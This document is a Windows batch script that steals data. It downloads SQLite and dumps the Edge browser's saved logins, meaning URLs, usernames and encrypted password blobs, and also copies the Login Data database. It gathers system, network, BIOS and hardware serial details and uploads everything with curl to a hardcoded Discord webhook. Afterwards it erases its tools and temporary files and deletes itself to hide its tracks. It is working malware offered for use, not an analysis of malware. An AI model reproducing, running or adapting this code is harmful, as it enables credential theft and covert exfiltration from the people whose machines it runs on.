@echo off
echo Hello! Made by Shane.

:: Set temporary directory for SQLite tools
set "SQLTMP=%TEMP%\sqltmp_%RANDOM%"
mkdir "%SQLTMP%" 2>nul

:: Download SQLite3 if not present
if not exist "%SQLTMP%\sqlite3.exe" (
    echo Downloading SQLite3...
    curl -L -o "%SQLTMP%\sqlite3.zip" "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430100.zip"
    tar -xf "%SQLTMP%\sqlite3.zip" -C "%SQLTMP%"
    move "%SQLTMP%\sqlite-tools-win32-x86-3430100\sqlite3.exe" "%SQLTMP%\sqlite3.exe" >nul
)

set "SQLITE3=%SQLTMP%\sqlite3.exe"

:: Extract Edge saved passwords
echo Edge Saved Passwords > edge_passwords.txt
echo. >> edge_passwords.txt
echo Extraction Date: %date% %time% >> edge_passwords.txt
echo. >> edge_passwords.txt

set "EDGE_DATA=%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data"
if exist "%EDGE_DATA%" (
    echo Edge Login Data file found. >> edge_passwords.txt
    echo. >> edge_passwords.txt
    echo Attempting to extract passwords (encrypted blobs will appear): >> edge_passwords.txt
    "%SQLITE3%" "%EDGE_DATA%" "SELECT origin_url, username_value, password_value FROM logins;" >> edge_passwords.txt 2>nul
    echo. >> edge_passwords.txt
    echo Login Data file copied as edge_login_data_copy.db >> edge_passwords.txt
    copy "%EDGE_DATA%" edge_login_data_copy.db >nul
) else (
    echo Edge Login Data file NOT found at: %EDGE_DATA% >> edge_passwords.txt
)

:: Collect detailed system information
echo System Information > sysinfo.txt
systeminfo >> sysinfo.txt

:: Network Configuration
echo. >> sysinfo.txt
echo Network Configuration >> sysinfo.txt
ipconfig /all >> sysinfo.txt

:: IPv4 Address
echo. >> sysinfo.txt
echo IPv4 Address >> sysinfo.txt
for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr "IPv4 Address"') do echo %%i >> sysinfo.txt

:: IPv6 Address
echo. >> sysinfo.txt
echo IPv6 Address >> sysinfo.txt
for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr "IPv6 Address"') do echo %%i >> sysinfo.txt

:: CPU Information
echo. >> sysinfo.txt
echo CPU Information >> sysinfo.txt
wmic cpu get name,description /value >> sysinfo.txt

:: BIOS Information
echo. >> sysinfo.txt
echo BIOS Information >> sysinfo.txt
wmic bios get name,version,serialnumber /value >> sysinfo.txt

:: GPU Information
echo. >> sysinfo.txt
echo GPU Information >> sysinfo.txt
wmic path win32_videocontroller get name,adapterram /value >> sysinfo.txt

:: Motherboard Information
echo. >> sysinfo.txt
echo Motherboard Information >> sysinfo.txt
wmic baseboard get product,manufacturer,serialnumber,version /value >> sysinfo.txt

:: Disk Drives
echo. >> sysinfo.txt
echo Disk Drives >> sysinfo.txt
wmic diskdrive get model,size /value >> sysinfo.txt

:: Memory Information
echo. >> sysinfo.txt
echo Memory Information >> sysinfo.txt
wmic memorychip get capacity,manufacturer,partnumber,speed /value >> sysinfo.txt

:: Set webhook URL
set "WEBHOOK_URL=https://discord.com/api/webhooks/1540227015473631243/D73LkFqH2DrUavolHZw3TeJuEeEivkKrih85dPYobc9wRII4yzQL4_NPLF_r03XgGpyC"

:: Send files to Discord webhook
echo Sending system info...
curl --ssl-no-revoke -F "file=@sysinfo.txt" %WEBHOOK_URL%

echo Sending Edge passwords text...
curl --ssl-no-revoke -F "file=@edge_passwords.txt" %WEBHOOK_URL%

if exist edge_login_data_copy.db (
    echo Sending Edge Login Data copy...
    curl --ssl-no-revoke -F "file=@edge_login_data_copy.db" %WEBHOOK_URL%
)

:: Clean up all files
echo Cleaning up...
del /f /q sysinfo.txt 2>nul
del /f /q edge_passwords.txt 2>nul
if exist edge_login_data_copy.db del /f /q edge_login_data_copy.db 2>nul

:: Clean up SQLite tools and temporary directory (force delete all traces)
if exist "%SQLTMP%" (
    echo Removing SQLite tools...
    taskkill /f /im sqlite3.exe 2>nul
    rmdir /s /q "%SQLTMP%" 2>nul
)

:: Clear any residual files in temp that might match
if exist "%TEMP%\sqlite-tools-win32-x86-3430100" rmdir /s /q "%TEMP%\sqlite-tools-win32-x86-3430100" 2>nul
if exist "%TEMP%\sqltmp" rmdir /s /q "%TEMP%\sqltmp" 2>nul
if exist "%TEMP%\sqltmp_*" rmdir /s /q "%TEMP%\sqltmp_*" 2>nul
if exist "%TEMP%\sqlite3.zip" del /f /q "%TEMP%\sqlite3.zip" 2>nul
if exist "%TEMP%\sqlite3.exe" del /f /q "%TEMP%\sqlite3.exe" 2>nul

:: Self-delete the batch file without leaving a trace
(goto) 2>nul & del "%~f0"
